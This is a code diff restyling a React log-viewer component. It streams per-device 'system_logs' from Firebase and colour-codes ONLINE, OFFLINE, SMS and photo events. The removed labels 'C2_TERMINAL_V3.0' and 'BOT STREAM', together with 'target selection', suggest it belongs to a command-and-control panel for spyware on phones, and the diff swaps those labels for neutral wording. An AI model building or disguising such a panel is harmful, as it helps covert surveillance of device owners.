@@ -28,14 +28,12 @@ export default function ActivityLog({ targetId }: ActivityLogProps) {
     }
 
     setLoading(true);
-    // Sync dengan node system_logs/{deviceId} seperti di KeiService.java
     const logRef = ref(database, `${FIREBASE_PATHS.SYSTEM_LOGS}/${targetId}`);
 
     const unsubscribe = onValue(logRef, (snapshot) => {
       const data = snapshot.val();
       if (data) {
         const logArray: LogEntry[] = Object.entries(data).map(([key, val]: any) => {
-           // Handle string format "[HH:mm] Message" or object format
            if (typeof val === 'string') {
              return { id: key, message: val };
            }
@@ -45,7 +43,6 @@ export default function ActivityLog({ targetId }: ActivityLogProps) {
              timestamp: val.timestamp
            };
         });
-        // Tampilkan 100 log terbaru
         setEntries(logArray.slice(-100));
       } else {
         setEntries([]);
@@ -62,73 +59,75 @@ export default function ActivityLog({ targetId }: ActivityLogProps) {
     }
   }, [entries]);
 
+  const getLogColor = (message: string) => {
+    if (message.includes('ONLINE')) return 'text-emerald-400';
+    if (message.includes('OFFLINE')) return 'text-red-400';
+    if (message.includes('SMS')) return 'text-cyan-400';
+    if (message.includes('Photo') || message.includes('photo') || message.includes('📸')) return 'text-amber-400';
+    if (message.includes('ERROR') || message.includes('error')) return 'text-red-400';
+    return 'text-slate-300';
+  };
+
   return (
-    <section className="rounded-[32px] border border-white/10 bg-slate-950/85 p-6 shadow-2xl shadow-slate-950/30 backdrop-blur-xl">
-      <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between mb-6">
+    <div className="rounded-2xl border border-white/[0.06] bg-white/[0.02] backdrop-blur-xl p-5">
+      {/* ── Header ── */}
+      <div className="flex items-center justify-between mb-4">
         <div>
-          <p className="text-sm uppercase tracking-[0.3em] text-rose-500/70">System Monitor</p>
-          <h3 className="mt-2 text-2xl font-semibold text-white">Live Activity Logs</h3>
-          <p className="max-w-sm text-[10px] text-slate-500 uppercase font-mono mt-1">
-            Real-time feed from firebase system_logs
-          </p>
+          <h3 className="text-lg font-bold text-white">Activity</h3>
+          <p className="text-[11px] text-slate-500 mt-0.5">Live system logs</p>
         </div>
-        <div className="flex items-center gap-3">
-           <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-rose-500/10 text-rose-500">
-             <ShieldAlert size={16} />
-           </div>
-           <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-cyan-500/10 text-cyan-500">
-             <Cpu size={16} />
-           </div>
-        </div>
-      </div>
-
-      <div className="relative group">
-        <div className="absolute -inset-0.5 bg-gradient-to-r from-rose-500/20 to-transparent rounded-[24px] blur opacity-50 group-hover:opacity-100 transition duration-1000"></div>
-        <div className="relative overflow-hidden rounded-[24px] border border-white/10 bg-black/90">
-          <div className="flex items-center justify-between px-4 py-2 border-b border-white/5 bg-white/5">
-             <div className="flex items-center gap-2">
-                <TerminalIcon size={12} className="text-rose-500" />
-                <span className="text-[10px] font-mono text-slate-400 uppercase tracking-widest">C2_TERMINAL_V3.0</span>
-             </div>
-             <div className="flex gap-1">
-                <div className="w-2 h-2 rounded-full bg-rose-500/50"></div>
-                <div className="w-2 h-2 rounded-full bg-yellow-500/50"></div>
-                <div className="w-2 h-2 rounded-full bg-emerald-500/50"></div>
-             </div>
+        <div className="flex items-center gap-1.5">
+          <div className="w-7 h-7 rounded-lg bg-red-500/10 flex items-center justify-center">
+            <ShieldAlert size={13} className="text-red-400" />
           </div>
-
-          <div
-            ref={containerRef}
-            className="min-h-[400px] max-h-[600px] overflow-y-auto p-5 font-mono text-[12px] leading-relaxed scrollbar-thin scrollbar-thumb-white/10"
-          >
-            {loading ? (
-              <div className="text-slate-600 animate-pulse">CONNECTING TO BOT STREAM...</div>
-            ) : !targetId ? (
-              <div className="text-slate-600">AWAITING TARGET SELECTION...</div>
-            ) : entries.length === 0 ? (
-              <div className="text-slate-600 italic">No logs found for this device ID.</div>
-            ) : (
-              entries.map((entry) => (
-                <div key={entry.id} className="mb-2 flex items-start gap-3 group/line">
-                  <span className="text-rose-500/40 opacity-0 group-hover/line:opacity-100 transition-opacity">»</span>
-                  <span className={cn(
-                    "whitespace-pre-wrap",
-                    entry.message.includes('ONLINE') ? "text-emerald-400" :
-                    entry.message.includes('OFFLINE') ? "text-rose-400" :
-                    entry.message.includes('SMS') ? "text-cyan-400" : "text-slate-300"
-                  )}>
-                    {entry.message}
-                  </span>
-                </div>
-              ))
-            )}
+          <div className="w-7 h-7 rounded-lg bg-cyan-500/10 flex items-center justify-center">
+            <Cpu size={13} className="text-cyan-400" />
           </div>
         </div>
       </div>
-    </section>
+
+      {/* ── Terminal ── */}
+      <div className="rounded-xl border border-white/[0.06] bg-black/50 overflow-hidden">
+        {/* Terminal title bar */}
+        <div className="flex items-center justify-between px-3 py-2 border-b border-white/[0.04] bg-white/[0.02]">
+          <div className="flex items-center gap-1.5">
+            <TerminalIcon size={11} className="text-emerald-500" />
+            <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest">terminal</span>
+          </div>
+          <div className="flex gap-1">
+            <div className="w-2 h-2 rounded-full bg-red-500/40" />
+            <div className="w-2 h-2 rounded-full bg-yellow-500/40" />
+            <div className="w-2 h-2 rounded-full bg-emerald-500/40" />
+          </div>
+        </div>
+
+        {/* Log content */}
+        <div
+          ref={containerRef}
+          className="min-h-[350px] max-h-[500px] overflow-y-auto p-4 font-mono text-[11px] leading-[1.8]"
+        >
+          {loading ? (
+            <div className="text-slate-600 animate-pulse">Connecting...</div>
+          ) : !targetId ? (
+            <div className="text-slate-600">
+              <span className="text-emerald-500/50">$</span> awaiting target selection...
+            </div>
+          ) : entries.length === 0 ? (
+            <div className="text-slate-600">
+              <span className="text-emerald-500/50">$</span> no logs found for this device
+            </div>
+          ) : (
+            entries.map((entry) => (
+              <div key={entry.id} className="flex items-start gap-2 group/line hover:bg-white/[0.01] -mx-1 px-1 rounded">
+                <span className="text-emerald-500/30 select-none shrink-0">›</span>
+                <span className={`whitespace-pre-wrap break-all ${getLogColor(entry.message)}`}>
+                  {entry.message}
+                </span>
+              </div>
+            ))
+          )}
+        </div>
+      </div>
+    </div>
   );
-}
-
-function cn(...inputs: any[]) {
-  return inputs.filter(Boolean).join(' ');
 }
